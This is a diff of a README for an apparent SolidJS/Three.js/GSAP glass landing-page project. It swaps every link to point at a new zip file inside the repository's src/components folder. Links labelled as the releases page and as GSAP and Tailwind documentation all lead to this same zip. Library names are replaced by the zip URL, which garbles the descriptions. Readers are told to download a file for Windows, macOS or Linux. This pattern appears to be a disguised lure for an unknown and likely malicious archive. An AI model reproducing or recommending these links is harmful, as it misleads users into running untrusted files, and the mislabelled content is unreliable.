@@ -4,13 +4,13 @@
 
 Welcome to the solidjs-threejs-gsap-dimensional-glass-landing project! This application allows you to create a beautiful 3D dimensional glass landing page. Enjoy prismatic refraction effects, smooth animations, and a unique user experience.
 
-[![Download Now](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip%20Now-Release-blue)](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip)
+[![Download Now](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip%20Now-Release-blue)](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to visit our releases page. Here, you can download the latest version of the application. Follow these steps:
 
-1. Click [here](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip) to go to the releases page.
+1. Click [here](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip) to go to the releases page.
 2. Find the latest version listed.
 3. Click on the version link to view available files.
 4. Download the appropriate file for your operating system (e.g., Windows, macOS, Linux).
@@ -51,8 +51,8 @@ To get started, you need to visit our releases page. Here, you can download the 
 
 This project uses several powerful technologies to deliver its features. Here's a brief overview:
 
-- **https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip**: A modern UI library that offers high performance.
-- **https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip**: A popular JavaScript library for 3D graphics on the web.
+- **https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip**: A modern UI library that offers high performance.
+- **https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip**: A popular JavaScript library for 3D graphics on the web.
 - **GSAP**: A flexible animation library that creates engaging animations.
 - **Tailwind CSS**: A utility-first CSS framework that helps you design without hassle.
 
@@ -73,9 +73,9 @@ Interested in contributing? We welcome improvements and new features! Please fol
 
 For those wanting to dive deeper into the technologies used, consider checking out the following resources:
 
-- [https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip)
-- [https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip)
-- [GSAP Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip)
-- [Tailwind CSS Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip)
+- [https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip)
+- [https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip)
+- [GSAP Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip)
+- [Tailwind CSS Documentation](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip)
 
-Once again, to download the application, visit the [releases page](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/glass_dimensional_gsap_landing_solidjs_threejs_v2.6.zip). Happy building!
+Once again, to download the application, visit the [releases page](https://github.com/safarazabimanyu/solidjs-threejs-gsap-dimensional-glass-landing/raw/refs/heads/main/src/components/threejs-dimensional-glass-gsap-solidjs-landing-1.2.zip). Happy building!
